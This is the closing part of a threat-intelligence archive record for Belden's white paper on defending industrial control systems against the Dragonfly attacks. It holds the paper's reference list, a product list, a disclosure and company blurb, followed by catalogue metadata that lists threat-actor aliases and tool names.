References\n\n[1 “Summing up Stuxnet in 4 Easy Sections (plus Handy Presentation),” TofinoSecurity.com blog, March 21, 2011.](https://www.tofinosecurity.com/blog/summing-stuxnet-4-easy-sections-plus-handy-presentation)\n\n[2 “Havex Hunts for ICS/SCADA Systems,” F-Secure blog, June 23, 2014.](http://www.f-secure.com/weblog/archives/00002718.html)\n\n[3 “Dragonfly: Cyberespionage Attacks Against Energy Suppliers,” Symantec Security Response v.1.21, July 7, 2014 (v1.0 first published](http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/Dragonfly_Threat_Against_Western_Energy_Suppliers.pdf)\n\nJune 30, 2014).\n\n[4 “Dragonfly: Western Energy Companies Under Sabotage Threat,” Symantec Security Response, June 30, 2014.](http://www.symantec.com/connect/blogs/dragonfly-western-energy-companies-under-sabotage-threat)\n\n[5 “How Dragonfly Hackers and RAT Malware Threaten ICS Security,” Belden.com blog, August 13, 2014.](http://www.belden.com/blog/industrialsecurity/How-Dragonfly-Hackers-and-RAT-Malware-Threaten-ICS-Security.cfm)\n\n[6 “How Stuxnet Spreads,” TofinoSecurity.com white paper, February 22, 2011.](https://www.tofinosecurity.com/how-stuxnet-spreads \r\r)\n\n7 [“Energetic Bear: more like a Crouching Yeti,” Kaspersky Labs, Securelist.com blog, July 31, 2014.](http://securelist.com/blog/research/65240/energetic-bear-more-like-a-crouching-yeti/)\n\n8 Spear phishing is email spoofing fraud that targets organizations seeking unauthorized access to confidential data.\n\n9 Watering hole is an attack technique used to draw multiple targets interested in specific content to one destination, such as a website.\n\n10 Trojanized software is legitimate software that has been infected with malware.\n\n[11 “Energy companies hit by cyber attack from Russia-linked group,” FT.com, June 30, 2014.](http://www.ft.com/cms/s/0/606b97b4-0057-11e4-8aaf-00144feab7de.html#axzz3CRn1KX9P)\n\n[12 “Energy firms hacked by ‘cyber-espionage group Dragonfly,” BBC.com, July 1, 2014.](http://www.bbc.com/news/technology-28106478)\n\n[13 “The Epic Turla Operation – Solving some of the mysteries of Snake/Uroburos,” Kaspersky Labs Securelist.com blog, August 7, 2014.](https://securelist.com/analysis/publications/65545/the-epic-turla-operation/)\n\n[14 “Evolving History of Havex Module Downloader,” Fortinet blog, July 9, 2014.](http://blog.fortinet.com/post/evolving-history-of-havex-module-downloader)\n\n[15 “Watering-Hole Attacks Target Energy Sector,” Cisco Blogs, September 18, 2013.](http://blogs.cisco.com/security/watering-hole-attacks-target-energy-sector/)\n\n[16 “Talk2M Incident Report,” Talk2M, January 30, 2014.](http://www.talk2m.com/en/full_news.html?cmp_id=7&news_id=51)\n\n[17 “January Security Incident Follow-up Report,” Talk2M, July 3, 2014.](http://www.talk2m.com/en/january-security-incident-follow-up-report.html?cmp_id=7&news_id=52&vID=17)\n\n[18 “eGrabit version 3.1 is now online,” eWON, February 28, 2014.](http://www.ewon.biz/en/egrabit-version-3.1-is-now-online.html?cmp_id=7&news_id=4367)\n\n[19 “Analysis of the 7-Technologies IGSS Security Vulnerabilities for Industrial Control System Professionals,” Tofinosecurity.com white paper,](https://www.tofinosecurity.com/professional/analysis-7-technologies-igss-security-vulnerabilities)\n\nMarch 28, 2011.\n\n[20 “Windows XP End of Service: Practical Options for Industrial Applications,” Belden white paper, May 2014.](http://info.belden.com/cyber-security-windows-xp-bc-lp)\n\n[21 “Patching Has Its Place in SCADA and ICS Security,” Belden.com blog, April 8, 2013.](http://www.belden.com/blog/industrialsecurity/Patching-Has-Its-Place-in-SCADA-and-ICS-Security.cfm)\n\n[22 “Heartbleed in OpenSSL: Take Action Now!,” Symantec Website Security Concerns blog, April 9, 2014.](http://www.symantec.com/connect/blogs/heartbleed-openssl-take-action-now)\n\n[23 “Cyber Security Procurement Language for Control Systems,” U.S. Department of Homeland Security, September 2009.](https://ics-cert.us-cert.gov/sites/default/files/documents/Procurement_Language_Rev4_100809.pdf)\n\n[24 “ISA/IEC 62443 Standards” Tofinosecurity.com webpage.](https://www.tofinosecurity.com/why/isa-iec-62443)\n\n[25 “ISA99 Committee – Work Product List,” ISA.org webpage.](https://www.tofinosecurity.com/why/isa-iec-62443)\n\n[26 “ISASecure Program,” ISAsecure.org webpage.](http://www.isasecure.org/Home.aspx)\n\n[27 “Strategies to Mitigate Target Cyber Intrusions,” Australian Government Department of Defense, February 2014.](http://www.isasecure.org/Home.aspx)\n\n[28 “Understanding Deep Packet Inspection for SCADA Security,” Belden white paper, December 2012.](http://info.belden.com/dpi-tk-lp)\n\n### Additional Information\n\n[• “ICS Focused Malware,” ICS-ALERT-14-176-02A, DHS ICS-CERT, originally published June 27, 2014.](https://ics-cert.us-cert.gov/alerts/ICS-ALERT-14-176-02A )\n\n[• “ICS Focused Malware,” ICSA-14-178-01, DHS ICS-CERT, originally published June 30, 2014.](https://ics-cert.us-cert.gov/advisories/ICSA-14-178-01 )\n\n[• “How Dragonfly Hackers and RAT Malware Threaten ICS Security,” Belden.com blog, September 15, 2014.](http://www.belden.com/blog/industrialsecurity/How-Dragonfly-Hackers-and-RAT-Malware-Threaten-ICS-Security_040503.cfm)\n\n[• “Belden Research Reveals Dragonfly Malware Likely Targets Pharmaceutical Companies,” Belden press release, September 15, 2014.](http://www.businesswire.com/news/home/20140915005170/en/Belden-Research-Reveals-Dragonfly-Malware-Targets-Pharmaceutical)\n\n[• “A New Era for ICS Security – Dragonfly Introduces Offense in Depth,” Belden.com blog, October 22, 2014.](http://www.belden.com/blog/industrialsecurity/A-New-Era-for-ICS-Security-Dragonfly-Introduces-Offense-in-Depth.cfm)\n\n[• “Defending Against the Dragonfly Cyber Security Attacks,” Belden.com blog, December 10, 2014.](http://www.belden.com/blog/industrialsecurity/Defending-Against-the-Dragonfly-Cyber-Security-Attacks.cfm)\n\n\n-----\n\n## Be Certain with Belden\n\n### Belden Products for Defense in Depth\n\nThe following products are referenced in this white paper. Note that all products are industrially hardened with certifications for use in many\nindustries.\n\n[This is a partial list of Belden’s cyber security portfolio. For a complete list, visit www.belden.com or contact Belden.](http://www.belden.com)\n\n**Product Category and Name........................................................................................................................................................................... Page Where Usage is Described**\n\nIntegrated VPN/Stateful Industrial Firewall Devices\n\n- [Hirschmann Industrial Security Router.............................................................................................................................................................................................26, 28, 29](http://www.belden.com/products/industrialnetworking/routers/eagle-one-security-router.cfm)\n\nIndustrial Stateful Firewalls for Network Segmentation\n\n- [Tofino Industrial Network Security Appliance........................................................................................................................................................................................28, 29](http://www.belden.com/products/industrialnetworking/routers/tofino-xenon.cfm)\n\n- [Hirschmann Industrial Security Router.............................................................................................................................................................................................26, 28, 29](http://www.belden.com/products/industrialnetworking/routers/eagle-one-security-router.cfm)\n\n- [Hirschmann Multi-Port Firewall......................................................................................................................................................................................................................... 26](http://www.belden.com/products/industrialnetworking/routers/eagle-20-30.cfm)\n\nProtocol Whitelisting/Deep Packet Inspection Firewalls\n\n- [Tofino EtherNet/IP Enforcer................................................................................................................................................................................................................................ 26](http://www.belden.com/products/industrialnetworking/routers/upload/TofinoEtherNetIPEnforcerLSM_PB1090.pdf)\n\n- [Tofino OPC Classic Enforcer................................................................................................................................................................................................................................. 26](http://www.belden.com/products/industrialnetworking/routers/upload/TofinoOPCClassicEnforcerLSM_PB1088.pdf)\n\n- [Tofino Modbus TCP Enforcer..............................................................................................................................................................................................................................n/a](http://www.belden.com/products/industrialnetworking/routers/upload/TofinoModbusTCPEnforcerLSM_PB1087.pdf)\n\nManaged Switches for Network Segmentation\n\n- [Hirschmann RSP Product Line............................................................................................................................................................................................................................ 28](http://www.belden.com/products/industrialnetworking/managedswitches/rsp-switches-family.cfm)\n\n- [Hirschmann MSP Product Line........................................................................................................................................................................................................................... 28](http://www.belden.com/products/industrialnetworking/managedswitches/msp30-layer-3-switch.cfm)\n\n- [Hirschmann Octopus Product Line...................................................................................................................................................................................................................n/a](http://www.belden.com/products/industrialnetworking/managedswitches/octopus.cfm)\n\nWorkgroup Managed Switches for Network Segmentation\n\n- [Hirschmann MACH100 Product Line................................................................................................................................................................................................................ 28](http://www.belden.com/products/industrialnetworking/managedswitches/mach100.cfm)\n\n### Disclosure\n\nThis paper has been written using only information available from public sources, including that designated as TLP:White or TLP:Green. Restricted\ninformation, including all TLP:Amber sources, has not been considered or disclosed in this paper.\n\nVirusTotal supplied all malware used in this evaluation, with authenticity confirmed against known signatures provided by F-Secure and ICS-CERT.\n\n### About Belden\n\n**Belden Inc., a global leader in high-quality, end-to-end signal transmission solutions, delivers a comprehensive product portfolio**\n**designed to meet the mission-critical network infrastructure needs of industrial, enterprise and broadcast markets.**\n\n**With innovative solutions targeted at reliable and secure transmission of rapidly growing amounts of data, audio and video needed**\n**for today’s applications, Belden is at the center of the global transformation to a connected world.**\n\n**Founded in 1902, the company is headquartered in St. Louis and has manufacturing capabilities in North and South America,**\n**[Europe and Asia. For more information, visit us at www.belden.com; follow us on Twitter](http://www.belden.com)** **[@BeldenInc.](https://twitter.com/BeldenInc)**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/ICS SCADA/Havex/Defending Against the Dragonfly Cyber Security Attacks v3.0.pdf"
    ],
    "report_names": [
        "Defending Against the Dragonfly Cyber Security Attacks v3.0.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f276b8a6-73c9-494a-8ab2-13e2f1da4c53",
            "created_at": "2022-10-25T16:07:24.441133Z",
            "updated_at": "2025-03-27T02:02:10.231958Z",
            "deleted_at": null,
            "main_name": "Achilles",
            "aliases": [],
            "source_name": "ETDA:Achilles",
            "tools": [
                "RDP",
                "Remote Desktop Protocol"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "5cbf6c32-482d-4cd2-9d11-0d9311acdc28",
            "created_at": "2023-01-06T13:46:38.39927Z",
            "updated_at": "2025-03-27T02:00:02.823829Z",
            "deleted_at": null,
            "main_name": "ENERGETIC BEAR",
            "aliases": [
                "DYMALLOY",
                "TG-4192",
                "Crouching Yeti",
                "Group 24",
                "Havex",
                "IRON LIBERTY",
                "Blue Kraken",
                "ALLANITE",
                "Koala Team",
                "G0035",
                "ATK6",
                "ITG15",
                "Ghost Blizzard",
                "BERSERK BEAR"
            ],
            "source_name": "MISPGALAXY:ENERGETIC BEAR",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "649b5b3e-b16e-44db-91bc-ae80b825050e",
            "created_at": "2022-10-25T15:50:23.290412Z",
            "updated_at": "2025-03-27T02:00:55.431037Z",
            "deleted_at": null,
            "main_name": "Dragonfly",
            "aliases": [
                "TEMP.Isotope",
                "DYMALLOY",
                "Berserk Bear",
                "TG-4192",
                "Crouching Yeti",
                "IRON LIBERTY",
                "Energetic Bear",
                "Ghost Blizzard"
            ],
            "source_name": "MITRE:Dragonfly",
            "tools": [
                "MCMD",
                "Impacket",
                "CrackMapExec",
                "Backdoor.Oldrea",
                "Mimikatz",
                "PsExec",
                "Trojan.Karagany",
                "netsh"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "1a76ed30-4daf-4817-98ae-87c667364464",
            "created_at": "2022-10-25T16:47:55.891029Z",
            "updated_at": "2025-03-27T02:05:17.408867Z",
            "deleted_at": null,
            "main_name": "IRON LIBERTY",
            "aliases": [
                "ATK6 ",
                "BROMINE ",
                "CASTLE ",
                "Crouching Yeti ",
                "DYMALLOY ",
                "Dragonfly ",
                "Energetic Bear / Berserk Bear ",
                "Ghost Blizzard ",
                "TEMP.Isotope ",
                "TG-4192 ",
                "ALLANITE "
            ],
            "source_name": "Secureworks:IRON LIBERTY",
            "tools": [
                " Ddex Loader",
                " Havex",
                " Karagany",
                " Loek",
                " MCMD",
                " Sysmain",
                " xfrost",
                "ClientX"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "3a0be4ff-9074-4efd-98e4-47c6a62b14ad",
            "created_at": "2022-10-25T16:07:23.590051Z",
            "updated_at": "2025-03-27T02:02:09.878211Z",
            "deleted_at": null,
            "main_name": "Energetic Bear",
            "aliases": [
                "ATK 6",
                "Blue Kraken",
                "Crouching Yeti",
                "Dragonfly",
                "Electrum",
                "Energetic Bear",
                "Ghost Blizzard",
                "Group 24",
                "ITG15",
                "Iron Liberty",
                "Koala Team",
                "TG-4192"
            ],
            "source_name": "ETDA:Energetic Bear",
            "tools": [
                "Backdoor.Oldrea",
                "CRASHOVERRIDE",
                "Commix",
                "CrackMapExec",
                "CrashOverride",
                "Dirsearch",
                "Dorshel",
                "Fertger",
                "Fuerboos",
                "Goodor",
                "Havex",
                "Havex RAT",
                "Hello EK",
                "Heriplor",
                "Impacket",
                "Industroyer",
                "Karagany",
                "Karagny",
                "LightsOut 2.0",
                "LightsOut EK",
                "Listrix",
                "Oldrea",
                "PEACEPIPE",
                "PHPMailer",
                "PsExec",
                "SMBTrap",
                "Subbrute",
                "Sublist3r",
                "Sysmain",
                "Trojan.Karagany",
                "WSO",
                "Webshell by Orb",
                "Win32/Industroyer",
                "Wpscan",
                "nmap",
                "sqlmap",
                "xFrost"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a97cf06d-c2e2-4771-99a2-c9dee0d6a0ac",
            "created_at": "2022-10-25T16:07:24.349252Z",
            "updated_at": "2025-03-27T02:02:10.184406Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "ATK 13",
                "Belugasturgeon",
                "Blue Python",
                "CTG-8875",
                "Group 88",
                "ITG12",
                "Iron Hunter",
                "Krypton",
                "Makersmark",
                "Operation Epic Turla",
                "Operation Moonlight Maze",
                "Operation Penguin Turla",
                "Operation Satellite Turla",
                "Operation Skipper Turla",
                "Operation Turla Mosquito",
                "Operation WITCHCOVEN",
                "Pacifier APT",
                "Pensive Ursa",
                "Popeye",
                "SIG15",
                "SIG2",
                "SIG23",
                "Secret Blizzard",
                "TAG-0530",
                "Turla",
                "UNC4210",
                "Venomous Bear",
                "Waterbug"
            ],
            "source_name": "ETDA:Turla",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "ATI-Agent",
                "AdobeARM",
                "Agent.BTZ",
                "Agent.DNE",
                "BigBoss",
                "COMpfun",
                "Chinch",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobra Carbon System",
                "ComRAT",
                "DoublePulsar",
                "EmPyre",
                "EmpireProject",
                "Epic Turla",
                "EternalBlue",
                "EternalRomance",
                "GoldenSky",
                "Group Policy Results Tool",
                "HTML5 Encoding",
                "HyperStack",
                "IcedCoffee",
                "IronNetInjector",
                "KSL0T",
                "Kapushka",
                "Kazuar",
                "KopiLuwak",
                "Kotel",
                "LOLBAS",
                "LOLBins",
                "LightNeuron",
                "Living off the Land",
                "Maintools.js",
                "Metasploit",
                "Meterpreter",
                "MiamiBeach",
                "Mimikatz",
                "MiniDionis",
                "Minit",
                "NBTscan",
                "NETTRANS",
                "NETVulture",
                "Neptun",
                "NetFlash",
                "NewPass",
                "Outlook Backdoor",
                "Penquin Turla",
                "Pfinet",
                "PowerShell Empire",
                "PowerShellRunner",
                "PowerShellRunner-based RPC backdoor",
                "PowerStallion",
                "PsExec",
                "PyFlash",
                "QUIETCANARY",
                "Reductor RAT",
                "RocketMan",
                "SMBTouch",
                "SScan",
                "Satellite Turla",
                "SilentMoon",
                "Sun rootkit",
                "TTNG",
                "TadjMakhal",
                "Tavdig",
                "TinyTurla",
                "TinyTurla Next Generation",
                "TinyTurla-NG",
                "Topinambour",
                "Tunnus",
                "Turla",
                "Turla SilentMoon",
                "TurlaChopper",
                "Uroburos",
                "Urouros",
                "WCE",
                "WITCHCOVEN",
                "WhiteAtlas",
                "WhiteBear",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "Wipbot",
                "WorldCupSec",
                "XTRANS",
                "certutil",
                "certutil.exe",
                "gpresult",
                "nbtscan",
                "nbtstat",
                "pwdump"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8aaa5515-92dd-448d-bb20-3a253f4f8854",
            "created_at": "2024-06-19T02:03:08.147099Z",
            "updated_at": "2025-03-27T02:05:17.408118Z",
            "deleted_at": null,
            "main_name": "IRON HUNTER",
            "aliases": [
                "Belugasturgeon ",
                "Blue Python ",
                "CTG-8875 ",
                "ITG12 ",
                "KRYPTON ",
                "MAKERSMARK ",
                "Pensive Ursa ",
                "Secret Blizzard ",
                "Turla",
                "UAC-0003 ",
                "UAC-0024 ",
                "UNC4210 ",
                "Venomous Bear ",
                "Waterbug ",
                "ATK13 "
            ],
            "source_name": "Secureworks:IRON HUNTER",
            "tools": [
                " ComRAT",
                " Kazuar",
                " KopiLuwak",
                " LightNeuron",
                " Mosquito",
                " Nautilus",
                " Neuron",
                " Penquin",
                " PoisonFrog",
                " PyFlash",
                " Skipper",
                " Snake",
                " Tavdig",
                " TinyTurla",
                " Tunnus",
                "Carbon-DLL"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a97fee0d-af4b-4661-ae17-858925438fc4",
            "created_at": "2023-01-06T13:46:38.396415Z",
            "updated_at": "2025-03-27T02:00:02.823045Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Uroburos",
                "Hippo Team",
                "Pacifier APT",
                "MAKERSMARK",
                "ATK13",
                "UAC-0003",
                "IRON HUNTER",
                "Waterbug",
                "TAG_0530",
                "KRYPTON",
                "Popeye",
                "SIG23",
                "UAC-0144",
                "G0010",
                "Blue Python",
                "VENOMOUS Bear",
                "Group 88",
                "Pfinet",
                "ITG12",
                "UNC4210",
                "Secret Blizzard",
                "UAC-0024"
            ],
            "source_name": "MISPGALAXY:Turla",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d11c89bb-1640-45fa-8322-6f4e4053d7f3",
            "created_at": "2022-10-25T15:50:23.509601Z",
            "updated_at": "2025-03-27T02:00:55.487991Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Turla",
                "IRON HUNTER",
                "Group 88",
                "Waterbug",
                "WhiteBear",
                "Krypton",
                "Venomous Bear",
                "Secret Blizzard",
                "BELUGASTURGEON"
            ],
            "source_name": "MITRE:Turla",
            "tools": [
                "PsExec",
                "nbtstat",
                "ComRAT",
                "netstat",
                "certutil",
                "KOPILUWAK",
                "IronNetInjector",
                "LunarWeb",
                "Arp",
                "Uroburos",
                "PowerStallion",
                "Kazuar",
                "Systeminfo",
                "LightNeuron",
                "Mimikatz",
                "Tasklist",
                "LunarMail",
                "HyperStack",
                "NBTscan",
                "TinyTurla",
                "Penquin",
                "LunarLoader"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535974,
    "ts_updated_at": 1743041780,
    "ts_creation_date": 1418140859,
    "ts_modification_date": 1418140869,
    "files": {
        "pdf": "https://archive.orkl.eu/fca187550d3ce16092d51931f8c2667b25082b79.pdf",
        "text": "https://archive.orkl.eu/fca187550d3ce16092d51931f8c2667b25082b79.txt",
        "img": "https://archive.orkl.eu/fca187550d3ce16092d51931f8c2667b25082b79.jpg"
    }
}